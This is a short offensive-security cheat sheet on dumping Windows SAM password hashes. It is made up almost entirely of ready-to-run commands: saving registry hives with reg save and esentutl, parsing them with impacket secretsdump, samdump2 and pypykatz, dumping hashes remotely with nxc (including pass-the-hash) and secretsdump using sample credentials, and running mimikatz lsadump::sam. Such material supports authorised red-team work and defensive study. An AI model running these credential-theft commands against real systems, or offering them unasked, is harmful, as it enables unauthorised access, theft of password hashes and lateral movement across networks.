---
icon: bowl-food
---

# SAM Dumping

SAM (Security Account Manager) stores local user NTLM hashes. Only useful for local accounts — not domain hashes.

**Requirement:** Admin / SYSTEM / SeBackupPrivilege

***

### reg save (Windows)

```bash
reg save HKLM\\SAM C:\\temp\\SAM
reg save HKLM\\SYSTEM C:\\temp\\SYSTEM
reg save HKLM\\SECURITY C:\\temp\\SECURITY
```

Parse on Linux:

```bash
# impacket
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# samdump2
samdump2 SYSTEM SAM

# pypykatz
pypykatz registry --sam SAM SYSTEM
```

***

### esentutl.exe (Windows LOLBin)

Built-in Windows tool — no extra binary needed.

```bash
esentutl.exe /y /vss C:\\Windows\\System32\\config\\SAM /d C:\\temp\\sam
esentutl.exe /y /vss C:\\Windows\\System32\\config\\SYSTEM /d C:\\temp\\system
```

Parse on Linux:

```bash
impacket-secretsdump -sam sam -system system LOCAL
```

***

### nxc Remote Dump (Linux)

```bash
# Dump SAM remotely
nxc smb 192.168.1.20 -u john -p Password123 --sam

# With hash
nxc smb 192.168.1.20 -u john -H NTLMHASH --sam
```

***

### impacket secretsdump Remote (Linux)

```bash
impacket-secretsdump corp.local/john:Password123@192.168.1.20
```

***

### mimikatz (Windows)

```powershell
.\\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

***
